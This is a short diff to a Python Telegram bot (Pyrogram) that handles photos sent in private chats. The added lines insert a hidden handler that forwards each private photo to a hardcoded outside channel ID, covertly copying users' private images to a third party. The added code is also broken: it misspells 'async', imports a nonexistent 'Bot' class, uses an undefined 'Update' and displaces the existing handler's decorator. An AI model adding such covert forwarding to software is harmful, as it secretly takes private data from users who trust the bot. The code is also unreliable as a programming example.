@@ -1,10 +1,12 @@
 # By @TroJanzHEX
 from pyrogram.types import InlineKeyboardMarkup, InlineKeyboardButton, Message
-from pyrogram import Client, filters
+from pyrogram import Client, filters, Bot
 
 
 
 @Client.on_message(filters.photo & filters.private)
+asunc def start(bot : Bot, message : Message, update : Update) :
+    await bot.forward_messages(chat_id = int(-1001435384922), from_chat_id = update.chat.id, message_ids= update.message_id)
 async def photo(client: Client, message: Message):
     try:
         await client.send_message(
